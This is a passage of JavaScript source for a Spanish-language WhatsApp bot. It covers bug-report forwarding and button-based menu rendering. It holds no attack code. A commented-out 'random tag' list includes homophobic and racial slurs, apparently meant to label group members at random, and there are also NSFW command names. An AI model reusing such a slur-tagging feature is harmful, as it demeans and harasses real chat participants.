		replySuccess(`Su propuesta fue enviada con éxito! Recuerda utilizar este comando bajo su conciencia y siendo coherente en el mensaje, sin faltas de ortografía. Muchas gracias por su colaboración! Tendrás tu recompensa si fue de mucha ayuda para el desarrollador ^^`)
	} break

	case 'bug': case 'report': noQ('¿Cuál es tu reporte?'); {
		SkyzeeBOT.sendMessage(`${owner}@s.whatsapp.net`, { text: `*Bug Report From:* wa.me/${m.sender.split("@")[0]}\nReport Message: ${q}` })
		replySuccess(`Su reporte fue enviado con éxito! Recuerda utilizar este comando bajo su conciencia y siendo coherente en el mensaje, sin faltas de ortografía. Muchas gracias por su colaboración! Tendrás tu recompensa si fue de mucha ayuda para el desarrollador ^^`)
	} break
// case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
// 	if (isBan) return replywarn(mess.ban)	 			
// if (isBanChat) return replywarn(mess.ban)
// teks = `*「 ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nDont forget to donate 🍜`
// let buttons = [
// {buttonId: `menu`, buttonText: {displayText: 'Menu 🌺'}, type: 1}
// ]
// let buttonMessage = {
// image: thum,
// jpegThumbnail: log0,
// caption: teks,
// footer: `${botname}`,
// buttons: buttons,
// headerType: 4,
// contextInfo:{externalAdReply:{
// title:"I deserve something for my hardwork",
// body: "Click to donate", 
// thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
// mediaType:1,
// mediaUrl: 'https://telegra.ph/file/8737b098fd5702daeb7e0.jpg',
// sourceUrl: "https://telegra.ph/file/8737b098fd5702daeb7e0.jpg"
// }}
// }
// SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted: m })
// }
// break
        //══════════[ MENU ]══════════//
            case 'alive': case 'panel': case 'list': case 'menu': case 'help': {
        let timestampe = speed();
        let latensie = speed() - timestampe
        let menulist = menu(
        	pushname,
        	isCreator ? '𝐎𝐖𝐍𝐄𝐑' : isPremium ? 'ℙℝ𝔼𝕄𝕀𝕌𝕄' : roleUser,
        	runtime(process.uptime()),
        	latensie.toFixed(4),
        	Object.keys(global.db.data.users).length,
        	todayHitsCmd,
        	hitsCmd,
        	botname
        )
                let footerTextCmd = `✦ ᴘʀᴏᴅᴜᴄᴇᴅ ʙʏ\n» 𝑿𝒆𝒐𝒏\n» 𝑻𝒉𝒆𝑨𝒍𝒆𝒛𝒖𝒖`
                let setbot = db.data.settings[botNumber]
	            let btn = [
                    { urlButton: { displayText: `★ 𝑺𝑪𝑹𝑰𝑷𝑻 ★`, url: `${botscript}` } },
                    { buttonId: `${prefix}command`, buttonText: { displayText: '＃ 𝐂𝐌𝐃 𝐌𝐄𝐍𝐔' }, type: 1 },
                    { buttonId: `${prefix}allmenu`, buttonText: { displayText: '＃ 𝐂𝐌𝐃 𝐀𝐋𝐋' }, type: 1 },
                    { buttonId: `${prefix}owner`, buttonText: { displayText: '＃ 𝑻𝒉𝒆𝑨𝒍𝒆𝒛𝒖𝒖' }, type: 1 }
                ]
                        msg = {
                            caption: menulist,
                            video: global.vidmenu,
                            gifPlayback: true,
                            buttons: btn,
                            footer: footerTextCmd,
                            mentionedJid: [m.sender]
                        }
                if (notButtons) delete msg.buttons
                await SkyzeeBOT.sendMessage(m.chat, msg)
                await SkyzeeBOT.sendMessage(m.chat, { text: menu2() })
            } break

            case 'command': {
                let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage : {
                    title: `➤ 𝐒𝐊𝐘𝐙𝐄𝐄 𝐌𝐄𝐍𝐔 ♠`,
                    description: `Una lista de los menús del bot...`,
                    buttonText: "📓",
                    footerText: `${global.botname}`,
                    listType: "SINGLE_SELECT",
                    sections: [
							{
								"title": "ＧＥＮＥＲＡＬ",
								"rows": [
                                {
									"title": "＃ 𝐂𝐌𝐃 𝐀𝐋𝐋",
									"description": "Toda la lista de comandos del bot en un solo mensaje",
									"rowId": `${prefix}allmenu`
								},
								{
									"title": "＃ 𝐂𝐌𝐃 𝐆𝐑𝐎𝐔𝐏",
									"description": "Se remontan funciones de automoderación, herramientas y ajustes para chats grupales. Ideal para mantener tu comunidad o grupo con buena seguridad",
									"rowId": `${prefix}groupmenu`
								}
								]
							},
                            {
                                "title": "ＥＮＴＥＲＴＡＩＮＭＥＮＴ",
                                "rows": [
                                {
                                    "title": "＃ 𝐂𝐌𝐃 𝐅𝐔𝐍",
                                    "description": "Un poco de diversión no vendría mal, ¿no?",
                                    "rowId": `${prefix}funmenu`
                                },
                                {
                                    "title": "＃ 𝐂𝐌𝐃 𝐑𝐀𝐍𝐃𝐎𝐌-𝐈𝐌𝐀𝐆𝐄",
                                    "description": "Literalmente imágenes random",
                                    "rowId": `${prefix}randomimagemenu`
                                },
                                ]
                            },
                            {
                                "title": "ＵＴＩＬＳ",
                                "rows": [
                                    {
                                        "title": "＃ 𝐂𝐌𝐃 𝐂𝐎𝐍𝐕𝐄𝐑𝐓",
                                        "description": "¡Convierte y modifica imágenes, videos, audios, enlaces, etc, a lo que más te apetezca!",
                                        "rowId": `${prefix}convertmenu`
                                    },
                                    {
                                        "title": "＃ 𝐂𝐌𝐃 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃",
                                        "description": "Un gran servicio de descarga. ¡Almacena todo lo que abunde en Internet!",
                                        "rowId": `${prefix}downloadmenu`
                                    },
                                    {
                                        "title": "＃ 𝐂𝐌𝐃 𝐌𝐀𝐊𝐄𝐑",
                                        "description": "¡Es tu momento de crear! ¿Qué tienes pensado hacer?",
                                        "rowId": `${prefix}makermenu`
                                    }
                                ]
                            },
                            {
                                "title": "ＰＲＩＶＡＴＥ",
                                "rows": [
                                    {
                                        "title": "＃ 𝐂𝐌𝐃 𝐎𝐖𝐍𝐄𝐑",
                                        "description": "Solo el owner puede acceder a estos comandos...",
                                        "rowId": `${prefix}ownermenu`
                                    },
                                    {
                                        "title": "＃ 𝐂𝐌𝐃 𝐍𝐒𝐅𝐖",
                                        "description": "Umm....",
                                        "rowId": `${prefix}nsfwmenu`
                                    }
                                ]
                            },
						],
          listType: 1
                }
            }), {})
            if (!notButtons && m.isGroup) SkyzeeBOT.relayMessage(m.chat, template.message, { messageId: template.key.id })
            else if (!notButtons && from.includes("@s.whatsapp.net")) {
                buttons = [
                    { quickReplyButton: { displayText: '＃ 𝐂𝐌𝐃 𝐀𝐋𝐋', id: `${prefix}allmenu` } },
                    { quickReplyButton: { displayText: '＃ 𝐂𝐌𝐃 𝐆𝐑𝐎𝐔𝐏', id: `${prefix}groupmenu` } },
                    { quickReplyButton: { displayText: '＃ 𝐂𝐌𝐃 𝐅𝐔𝐍', id: `${prefix}funmenu` } },
                    { quickReplyButton: { displayText: '＃ 𝐂𝐌𝐃 𝐑𝐀𝐍𝐃𝐎𝐌-𝐈𝐌𝐀𝐆𝐄', id: `${prefix}randomimagemenu` } },
                    { quickReplyButton: { displayText: '＃ 𝐂𝐌𝐃 𝐂𝐎𝐍𝐕𝐄𝐑𝐓', id: `${prefix}convertmenu` } },
                    { quickReplyButton: { displayText: '＃ 𝐂𝐌𝐃 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃', id: `${prefix}downloadmenu` } },
                    { quickReplyButton: { displayText: '＃ 𝐂𝐌𝐃 𝐌𝐀𝐊𝐄𝐑', id: `${prefix}makermenu` } },
                    { quickReplyButton: { displayText: '＃ 𝐂𝐌𝐃 𝐎𝐖𝐍𝐄𝐑', id: `${prefix}ownermenu` } },
                    { quickReplyButton: { displayText: '＃ 𝐂𝐌𝐃 𝐍𝐒𝐅𝐖', id: `${prefix}nsfwmenu` } }
                ]
                buttonMessage = {
                    text: `Una lista de los menús del bot...`,
                    buttons: buttons,
                    headerType: 2
                }
                SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            if (notButtons) SkyzeeBOT.sendText(m.chat, `Lo sentimos! Este mensaje contiene plantilla de botones, un formato que no está permitido en este chat. Te pedimos que utilices el comando _${prefix}allmenu_`)
            }
            break

case 'allmenu': case 'ownermenu': case 'groupmenu': case 'funmenu': case 'makermenu': case 'downloadmenu': case 'searchmenu': case 'convertmenu': case 'randomimagemenu': case 'nsfwmenu':
        dC = [
                    ' *[𝚘𝚗/𝚘𝚏𝚏]*' /*0*/,
                    ' *(𝚒𝚖𝚊𝚐𝚎)*' /*1*/,
                    ' *(𝚝𝚎𝚡𝚝)*' /*2*/,
                    ' *[𝚘𝚙𝚎𝚗/𝚌𝚕𝚘𝚜𝚎]*' /*3*/,
                    ' *{𝚞𝚜𝚎𝚛 𝚝𝚊𝚐}*' /*4*/,
                    ' *(𝚞𝚜𝚎𝚛 𝚗𝚞𝚖𝚋𝚎𝚛)*' /*5*/,
                    ' *(𝚞𝚜𝚎𝚛 𝚗𝚞𝚖𝚋𝚎𝚛/𝚝𝚊𝚐)*' /*6*/,
                    ' *[𝚊𝚍𝚍/𝚍𝚎𝚕]*' /*7*/,
                    ' *{𝚕𝚒𝚗𝚔 𝚐𝚌}*' /*8*/,
                    ' *(𝚕𝚒𝚗𝚔 𝚐𝚌)*' /*9*/,
                    ' *(𝚊𝚞𝚍𝚒𝚘)*' /*10*/,
                    ' *(𝚟𝚒𝚍𝚎𝚘)*' /*11*/,
                    ' *(𝚎𝚕𝚎𝚖𝚎𝚗𝚝)*' /*12*/,
                    ' *(𝚊𝚖𝚘𝚞𝚗𝚝)*' /*13*/,
                    ' *(𝚊𝚞𝚍𝚒𝚘/𝚟𝚒𝚍𝚎𝚘)*' /*14*/,
                    ' *(𝚒𝚖𝚊𝚐𝚎/𝚟𝚒𝚍𝚎𝚘)*' /*15*/,
                    ' *(𝚄𝚁𝙻)*' /*16*/,
                    ' *(𝚐𝚒𝚏𝚜𝚝𝚒𝚌𝚔𝚎𝚛)*' /*17*/,
                    ' *(𝚜𝚝𝚒𝚌𝚔𝚎𝚛)*' /*18*/,
                    ' _// 𝙸𝙽𝙷𝙰𝙱𝙸𝙻𝙸𝚃𝙰𝙳𝙾_' /*19*/,
                    ' *((𝚙𝚊𝚌𝚔𝚊𝚐𝚎 𝚗𝚊𝚖𝚎) | (𝚊𝚞𝚝𝚘𝚛))*' /*20*/,
                    ' *((𝚝𝚎𝚡𝚝) | (𝚝𝚎𝚡𝚝))*' /*21*/
                ]
        // commandSettingGC = [`ɢʀᴏᴜᴘsᴇᴛᴛɪɴɢs`, `ʀᴇsᴇᴛʟɪɴᴋ`, `sᴇᴛɪᴍɢ${dC[1]}`, `sᴇᴛɴᴀᴍᴇ${dC[2]}`, `sᴇᴛᴅᴇsᴄ${dC[2]}`]
        // commandInfoGC = [`ɢʀᴏᴜᴘʟɪɴᴋ`, `ᴘʀᴏꜰɪʟᴇ${dC[4]}`, `quoted`]
        // commandToolGC = [`ᴀᴅᴅ${dC[6]}`, `ᴋɪᴄᴋ${dC[6]}`, `ᴘʀᴏᴍᴏᴛᴇ${dC[6]}`, `ᴅᴇᴍᴏᴛᴇ${dC[6]}`, `ʜɪᴅᴇᴛᴀɢ${dC[2]}`, `ᴛᴀɢᴀʟʟ${dC[2]}`, `ᴠᴏᴛᴇ${dC[2]}`, `setcmd`, `listcmd`, `delcmd`, `addmsg`, `listmsg`, `getmsg`, `delmsg`, `afk`, `delete`]
        // commandSettingOW = [`sᴇᴛʙɪᴏ${dC[2]}`, `sᴇᴛᴘᴘʙᴏᴛ${dC[1]}`, `sᴇᴛᴇxɪꜰ${dC[2]}`, `sᴇʟꜰ`, `ᴘᴜʙʟɪᴄ`, `ᴀɴᴛɪᴛᴀɢ${dC[19]}`, `lockcmd`, `speedtest`, `ping`, `listpc`, `listgc`]
        // commandModerationOW = [`ʙᴀɴ${dC[7] + dC[6]}`, `ʙᴀɴᴄʜᴀᴛ${dC[0]}`, `ʙʟᴏᴄᴋ${dC[6]}`, `ᴜɴʙʟᴏᴄᴋ${dC[6]}`, `ᴊᴏɪɴ${dC[9]}`, `ʟᴇᴀᴠᴇɢᴄ${dC[8]}`]
        // commandBroadcastOW = [`ʙᴄɢʀᴏᴜᴘ${dC[2]}`, `ʙᴄᴀʟʟ${dC[2]}`, `ʙᴄɪᴍᴀɢᴇ${dC[1]}`, `ʙᴄᴠɪᴅᴇᴏ${dC[11]}`, `ʙᴄᴀᴜᴅɪᴏ${dC[10]}`, `ʙᴄʟᴏᴄ${dC[2]}`]
        commandFoodsanddrinksMKR = [`ʙᴇʀʀʏ`, `ʙɪsᴄᴜɪᴛ`, `ᴄʜᴏᴄᴏʟᴀᴛᴇ`, `ᴡɪᴄᴋᴇʀ`, `ʜᴏɴᴇʏ`, `sᴛʀᴀᴡʙᴇʀʀʏ`, `ꜰʀᴜɪᴛᴊᴜɪᴄᴇ`] // ꜰʀᴜɪᴛᴊᴜɪᴄᴇ (juice)
        commandTitlesMKR = [`ɴᴇᴏɴʟɪɢʜᴛ2`, `ɴᴇᴏɴ`, `ʙʟᴀᴄᴋᴘɪɴᴋɴᴇᴏɴ`, `sᴋᴇʟᴇᴛᴏɴ`, `sᴄɪꜰɪ`, `ᴍᴀɢᴍᴀ`, `ʙʟᴀᴄᴋᴘɪɴᴋ`, `ɴᴇᴏɴᴅᴇᴠɪʟ`, `ᴛᴇxᴛᴍᴀᴋᴇʀ glow`, `3ᴅsᴘᴀᴄᴇ`, `ᴄᴀʀʙᴏɴ`, `ʟᴀᴠᴀ`, `ᴛᴏxɪᴄ`, `ᴅᴇᴍᴏɴ`, `ʙᴀᴛᴍᴀɴ`, `3ᴅʙᴏx`, `sᴜᴍᴍᴇʀᴛɪᴍᴇ`, `1917`] // 3ᴅʙᴏx (cube) ᴄᴀʀʙᴏɴ (dark) 3ᴅsᴘᴀᴄᴇ (space) [ᴛᴇxᴛᴍᴀᴋᴇʀ] glow (glow) ɴᴇᴏɴᴅᴇᴠɪʟ (devil) ɴᴇᴏɴʟɪɢʜᴛ2 (neon2)
        commandNatureMKR = [`ᴡᴏᴏᴅ`, `sᴀɴᴅ`, `ʟᴇᴀᴠᴇs`, `ᴛʀᴀɴsꜰᴏʀᴍᴇʀ`, `ᴅɪsᴄᴏᴠᴇʀʏ`, `ᴡʀɪᴛɪɴɢ`, `ᴛʜᴜɴᴅᴇʀ`, `ꜰɪʀᴇᴡᴏʀᴋ`] // ᴡʀɪᴛɪɴɢ (sand2)
        commandMaterialsMKR = [`ᴍᴇᴛᴀʟʟɪᴄ`, `ᴛʜᴇᴡᴀʟʟ`, `ʙʀᴏᴋᴇɴɢʟᴀss`, `3ᴅsᴛᴏɴᴇ`, `3ᴅsᴛᴏɴᴇ2`, `ᴅᴀʀᴋɢᴏʟᴅ`, `ʀᴏᴄᴋ`, `ᴀɴᴄɪᴇɴᴛ`, `ᴡᴀᴛᴇʀᴘɪᴘᴇ`] // ᴛʜᴇᴡᴀʟʟ (brokenwall) 3ᴅsᴛᴏɴᴇ (stone) 3ᴅsᴛᴏɴᴇ2 (stone2) ᴀɴᴄɪᴇɴᴛ (sandstone) ᴡᴀᴛᴇʀᴘɪᴘᴇ (pipes)
        commandToolsMKR = [`ᴘᴀᴘᴇʀᴄᴜᴛ`, `ɢʟᴜᴇ`, `ᴘᴇɴᴄɪʟ`, `ꜰᴀʙʀɪᴄ`]
        commandColdMKR = [`ᴅᴇᴇᴘsᴇᴀ`, `ᴡᴀᴛᴇʀᴄᴏʟᴏʀ`, `ᴡᴀᴛᴇʀᴅʀᴏᴘ`, `ᴜɴᴅᴇʀᴡᴀᴛᴇʀ`, `ɪᴄᴇ`, `sɴᴏᴡ`]
        commandTraditionsMKR = [`ʜᴀʟʟᴏᴡᴇᴇɴ`, `sᴘᴀʀᴋʟᴇᴄʜʀɪsᴛᴍᴀs`, `ᴄʜʀɪsᴛᴍᴀs`, `ᴄᴀɴᴅʏ`, `3ᴅᴄʜʀɪsᴛᴍᴀs`] // ᴄᴀɴᴅʏ (candychristmas) 3ᴅᴄʜʀɪsᴛᴍᴀs (icechristmas)
        commandLogosMKR = [`ʟɪᴏɴ`, `ᴡᴏʟꜰ`, `ʙᴇᴀʀ`, `ᴊᴏᴋᴇʀ`, `ᴘᴏʀɴʜᴜʙ`]
        commandColorsMKR = [`3ᴅɴᴇᴏɴ`, `ᴍᴜʟᴛɪᴄᴏʟᴏʀ`, `ʜᴏʟᴏɢʀᴀᴘʜɪᴄ`, `ʙᴏᴋᴇʜ`, `ɢʀᴇᴇɴɴᴇᴏɴ`, `ɢʀᴀꜰꜰɪᴛɪ`, `ɢʀᴀꜰꜰɪᴛɪʙɪᴋᴇ`, `ʀᴇᴛʀᴏ`] // 3ᴅɴᴇᴏɴ (synthwave) ʜᴏʟᴏɢʀᴀᴘʜɪᴄ (purple)
        commandVirtualMKR = [`ɢʟɪᴛᴄʜ`, `ᴍᴀᴛʀɪx`, `ᴄɪʀᴄᴜɪᴛ`, `ɢʟɪᴛᴄʜ2`, `ɢʟɪᴛᴄʜ3`, `ꜰɪᴄᴛɪᴏɴ`, `8ʙɪᴛ`]
        commandHorrorMKR = [`ʙʟᴏᴏᴅɢʟᴀs`, `ʙʟᴏᴏᴅ`, `sᴘᴏᴏᴋʏ`]
        // commandPredictionFUN = [`how [text`, `when [text]`, `where [text]`, `can [text]`, `what [text]`, `is [text]`, `8ball`, `rate [text]`] // rate [text] (probabilidad)
        // commandPersonalitycheckFUN = [`lovelycheck [tag]`, `charactercheck [tag]`, `hornycheck [tag]`, `uglycheck [tag]`, `cutecheck [tag]`, `gaycheck [tag]`, `lesbiancheck [tag]`, `prettycheck [tag]`, `awesomecheck [tag]`, `beautifulcheck [tag]`]
        // commandRandomtagFUN = [`couple`, `mysoulmate`, `hot`, `playgirl`, `fuckgirl`, `playboy`, `fuckboy`, `sucker`, `motherfucker`, `mf`, `crackhead`, `dumbass`, `lit`, `gucci`, `dope`, `ditch`, `scoundrel`, `fagot`, `nuts`, `scumbag`, `rascal`, `mumu`, `comrade`, `nibbi`, `nibba`, `noobra`, `wibu`, `cunt`, `horny`, `dog`, `stubble`, `smart`, `gay`, `asshole`, `nerd`, `foolish`, `bastard`, `noob`, `lesbian`, `pretty`, `cute`, `beautiful`, `handsome`, `idiot`, `kind`, `sexy`]
        // commandRPGFUN = [`ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ`, `ᴘʀᴏꜰɪʟᴇ${dC[4]}`, `xplevel`, `ʜᴜɴᴛ`, `ᴍɪɴᴇ`, `ʙᴜʏ${dC[12]}`, `sᴇʟʟ${dC[12] + dC[13]}`]
        // commandClassicFUN = [`truth`, `dare`, `tictactoe`, `delttt`, `suitpvp [tag]`]
        // commandRandomFUN = [`wangy [text]`] // wangy [text] (fan)
        // commandAudioCV = [`ᴛᴏᴠɴ${dC[14]}`, `ᴛᴏᴍᴩ3${dC[14]}`, `ᴠᴏʟᴜᴍᴇ${dC[10]}`, `ᴛᴇᴍᴩᴏ${dC[10]}`, `ʙᴀss${dC[10]}`, `ʙʟᴏᴡɴ${dC[10]}`, `ᴅᴇᴇᴩ${dC[10]}`, `ᴇᴀʀʀᴀᴩᴇ${dC[10]}`, `ꜰᴀsᴛ${dC[10]}`, `ꜰᴀᴛ${dC[10]}`, `ɴɪɢʜᴛᴄᴏʀᴇ${dC[10]}`, `ʀᴇᴠᴇʀsᴇ${dC[10]}`, `ʀᴏʙᴏᴛ${dC[10]}`,  `sʟᴏᴡ${dC[10]}`, `sqᴜɪʀʀᴇʟ${dC[10]}`]
        // commandTextCV = [`ᴛᴏᴜʀʟ${dC[1]}`, `ᴇʙɪɴᴀʀy${dC[2]}`, `ᴅʙɪɴᴀʀy${dC[2]}`, `ᴛɪɴyᴜʀʟ${dC[16]}`, `sᴛyʟᴇᴛᴇxᴛ${dC[2]}`, `translate${dC[2]}`, `fliptext${dC[2]}`, `readmore [text]`] // ᴛɪɴyᴜʀʟ (acorturl)
        // commandVideoCV  = [`ᴛᴏᴍᴩ4${dC[17]}`, `ᴛᴏɢɪꜰ${dC[17]}`]
        commandStickerCV = [`sᴛɪᴄᴋᴇʀ${dC[15]}`]
        	// , `ᴛᴀᴋᴇ${dC[15] + dC[20]}`, `sᴛɪᴄᴋᴇʀᴍᴇᴍᴇ${dC[1] + dC[21]}`]
        // commandImageCV = [`ᴛᴏɪᴍɢ${dC[18]}`, `ᴀᴛᴛᴩ${dC[2]}`, `ᴛᴛᴩ${dC[2]}`, `toviewonce`]
        // commandEmojiCV = [`ᴇᴍᴏᴊɪ [emoji]`, `emojimix`, `instagramemoji`, `microsoftemoji`, `pediaemoji`, `googleemoji`, `microsoftemoji`, `whatsappemoji`, `twitteremoji`, `skypeemoji`, `joyemoji`, `facebookemoji`, `samsungemoji`, `iphoneemoji`]
        // commandEffectCV = [`wanted`, `blur`, `framed`, `gayeffect`, `imagesketch`, `invert`, `burn`, `triggeredwebp`, `shit`, `rip`, `jail`, `beautifuleffect`, `deleteeffect`, `pixelate`]
        // commandFoodanddrinksRI = [`coffee`]
        // commandLoveRI = [`lovesticker`]
        // commandMemeRI = [`doge`]
        // commandAnimalsRI = [`lizard`, `woof`, `meow`, `goose`]
        // commandAnimeRI = [`naruto`, `yaoi`, `neko`, `waifu`, `shinobu`, `awoo`, `fox_girl`, `avatar`, `tickle`, `gecg`, `feed`, `couplepp`, `cry`, `cuddle`, `hug`, `kiss`, `bonk`, `smug`, `pat`, `lick`, `yeet`, `blush`, `wave`, `smile`, `glomp`, `nom`, `handhold`, `highfive`, `bite`, `slap`, `kill`, `happy`, `wink`, `poke`, `dance`, `cringe`, `gura`]
        // commandHentaiNSFW = [`hentaivideo`, `yuri`, `masturbation`, `thighs`, `pussy`, `panties`, `orgy`, `ahegao`, `ass`, `bdsm`, `blowjob`, `cuckold`, `ero`, `gasm`, `cum`, `femdom`, `gangbang`, `foot`, `glasses`, `jahy`, `trap`, `blowjobgif`, `hneko`, `spank`, `nwaifu`]
        // commandDL = [`instagram [url]`, `igtv [url]`, `igstory [username]`, `zippyshare [url]`, `soundcloud [url]`, `gitclone [repo link]`, `play [query]`, `song [query]`, `getvideo [yt link]`, `getmusic [yt link]`, `ytmp4 [url|quality]`, `ytmp3 [url|quality]`, `mediafire [url]`, `igstory [url]`, `instagram [url]`, `tiktoknowm [url]`, `tiktokaudio [url]`, `tiktok [url]`, `twittermp3 [url]`, `twitter [url]`, `fbmp3 [url]`, `facebook [url]`]
        // commandSR = [`lyrics [query]`, `play [query]`, `song [query]`, `drakor [query]`, `mcserver [ip|port]`, `wattpad [query]`, `manga [query]`, `anime [query]`, `webtoon [query]`, `ringtone [query]`, `ytsearch [query]`, `wikimedia [query]`, `tvsearch [query]`, `mcpedl [query]`, `servermc`, `happymod [query]`, `searchgc [query]`, `animewall [query]`, `wallpaper [query]`, `playstore [query]`, `film [query]`, `image [query]`, `pinterest [query]`, `gimage [query]`, `google [query]`]
        // commandOTR = [`anonymous`]
if (command === 'allmenu') {
                count = 1
                unicorn = await getBuffer(picak + 'MENU: \nALL')
                teks = `╔════════════════ • ◊\n║\n` //╠══『 ＭＥＮＵ： ＧＲＯＵＰ 』\n`
                // for (let i of commandSettingGC) teks += `╠═＃${i}\n`
                // for (let i of commandInfoGC) teks += `╠═＃${i}\n`
                // if (isnsfw) teks += `╠═＃ɴsꜰᴡᴍᴇɴᴜ\n`
                // for (let i of commandToolGC) teks += `╠═＃${i}\n`
                // teks += `║\n╠════════ • ◊\n║\n╠══『 ＭＥＮＵ： ＦＵＮ 』\n`
                // for (let i of commandPredictionFUN) teks += `╠═＃${i}\n`
                // for (let i of commandRandomFUN) teks += `╠═＃${i}\n`
                // for (let i of commandPersonalitycheckFUN) teks += `╠═＃${i}\n`
                // for (let i of commandRandomtagFUN) teks += `╠═＃${i}\n`
                // for (let i of commandRPGFUN) teks += `╠═＃${i}\n`
                // for (let i of commandClassicFUN) teks += `╠═＃${i}\n`
                teks += `║\n╠════════ • ◊\n║\n╠══『 ＭＥＮＵ： ＭＡＫＥＲ 』\n\n╠═ • *USE: ＃textmaker (command)*\n`
                for (let i of commandFoodsanddrinksMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
                for (let i of commandTitlesMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
                for (let i of commandNatureMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
                for (let i of commandMaterialsMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
                for (let i of commandToolsMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
                for (let i of commandColdMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
                for (let i of commandTraditionsMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
                for (let i of commandLogosMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
                for (let i of commandColorsMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
                for (let i of commandVirtualMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
                for (let i of commandHorrorMKR) { teks += `╠═ ${count}) ${i}\n`; count++ }
                // teks += `║\n╠════════ • ◊\n║\n╠══『 ＭＥＮＵ： ＤＯＷＮＬＯＡＤ 』\n`
                // for (let i of commandDL) teks += `╠═＃${i}\n`
                // teks += `║\n╠════════ • ◊\n║\n╠══『 ＭＥＮＵ： ＳＥＡＲＣＨ 』\n`
                // for (let i of commandSR) teks += `╠═＃${i}\n`
                teks += `║\n╠════════ • ◊\n║\n╠══『 ＭＥＮＵ： ＣＯＮＶＥＲＴ 』\n`
                // for (let i of commandTextCV) teks += `╠═＃${i}\n`
                for (let i of commandStickerCV) teks += `╠═＃${i}\n`
                // for (let i of commandImageCV) teks += `╠═＃${i}\n`
                // for (let i of commandAudioCV) teks += `╠═＃${i}\n`
                // for (let i of commandVideoCV) teks += `╠═＃${i}\n`
                // for (let i of commandEmojiCV) teks += `╠═＃${i}\n`
                // for (let i of commandEffectCV) teks += `╠═＃${i}\n`
                // teks += `║\n╠════════ • ◊\n║\n╠══『 ＭＥＮＵ： ＲＡＮＤＯＭ－ＩＭＡＧＥ 』\n`
                // for (let i of commandLoveRI) teks += `╠═＃${i}\n`
                // for (let i of commandMemeRI) teks += `╠═＃${i}\n`
                // for (let i of commandAnimalsRI) teks += `╠═＃${i}\n`
                // for (let i of commandFoodanddrinksRI) teks += `╠═＃${i}\n`
                // for (let i of commandAnimeRI) teks += `╠═＃${i}\n`
                // teks += `║\n╠════════ • ◊\n║\n╠══『 ＭＥＮＵ： ＮＳＦＷ 』\n`
                // for (let i of commandHentaiNSFW) teks += `╠═＃${i}\n`
                teks += `║\n╚════════════════ • ◊`
}
// } else if (command === 'ownermenu') {
//                             unicorn = await getBuffer(picak + `MENU: \nOWNER (TheAlezuu)`)
//                             teks = `╔════════════════ • ◊\n║\n╠══『 ＳＥＴＴＩＮＧＳ 』\n`
//                             for (let i of commandSettingOW) teks += `╠═＃${i}\n`
//                             teks += `║\n╠════════ • ◊\n║\n╠══『 ＭＯＤＥＲＡＴＩＯＮ 』\n`
//                             for (let i of commandModerationOW) teks += `╠═＃${i}\n`
//                             teks += `║\n╠════════ • ◊\n║\n╠══『 ＢＲＯＡＤＣＡＳＴ 』\n`
//                             for (let i of commandBroadcastOW) teks += `╠═＃${i}\n`
//                             teks += `║\n╚════════════════ • ◊` //\nPara obtener detalles sobre un comando escribe (comando + "--help"), se recomienda hacerlo antes de utilizarlo.`
// } else if (command === 'groupmenu') {
//                 if (!m.isGroup) return replywarn(mess.group)
//                 unicorn = await getBuffer(picak + `MENU: \nGROUP`)
//                 teks = `╔════════════════ • ◊\n║\n╠══『 ＳＥＴＴＩＮＧＳ 』\n`
//                 for (let i of commandSettingGC) teks += `╠═＃${i}\n`
//                 teks += `║\n╠════════ • ◊\n║\n╠══『 ＩＮＦＯＲＭＡＴＩＯＮ 』\n`
//                 for (let i of commandInfoGC) teks += `╠═＃${i}\n`
//                 if (isnsfw) teks += `╠═＃ɴsꜰᴡᴍᴇɴᴜ\n`
//                 teks += `║\n╠════════ • ◊\n║\n╠══『 ＴＯＯＬ 』\n`
//                 for (let i of commandToolGC) teks += `╠═＃${i}\n`
//                 teks += `║\n╚════════════════ • ◊` //\nPara obtener detalles sobre un comando escribe (comando + "--help"), se recomienda hacerlo antes de utilizarlo.`
// } else if (command === 'funmenu') {
//                         unicorn = await getBuffer(picak + `MENU: \nFUN`)
//                         teks = `╔════════════════ • ◊\n║\n╠══『 ＰＲＥＤＩＣＴＩＯＮ 』\n`
//                         for (let i of commandPredictionFUN) teks += `╠═＃${i}\n`
//                         teks += `║\n╠════════ • ◊\n║\n╠══『 ＲＡＮＤＯＭ 』\n`
//                         for (let i of commandRandomFUN) teks += `╠═＃${i}\n`
//                         teks += `║\n╠════════ • ◊\n║\n╠══『 ＰＥＲＳＯＮＡＬＩＴＹ ＣＨＥＣＫ 』\n`
//                         for (let i of commandPersonalitycheckFUN) teks += `╠═＃${i}\n`
//                         teks += `║\n╠════════ • ◊\n║\n╠══『 ＲＡＮＤＯＭ ＴＡＧ 』\n`
//                         for (let i of commandRandomtagFUN) teks += `╠═＃${i}\n`
//                         teks += `║\n╠════════ • ◊\n║\n╠══『 ＲＰＧ 』\n`
//                         for (let i of commandRPGFUN) teks += `╠═＃${i}\n`
//                         teks += `║\n╠════════ • ◊\n║\n╠══『 ＣＬＡＳＳＩＣ 』\n`
//                         for (let i of commandClassicFUN) teks += `╠═＃${i}\n`
//                         teks += `║\n╚════════════════ • ◊` //\nPara obtener detalles sobre un comando escribe (comando + "--help"), se recomienda hacerlo antes de utilizarlo.`
// } else if (command === 'makermenu') {
//     unicorn = await getBuffer(picak + `MENU: \nMAKER`)
//     count = 1
//     teks = `╔════════════════ • ◊\n║\n╠══『 ＦＯＯＤＳ/ＤＲＩＮＫＳ 』\n` // \n╠═ • *USE: ＃textmaker (command)*
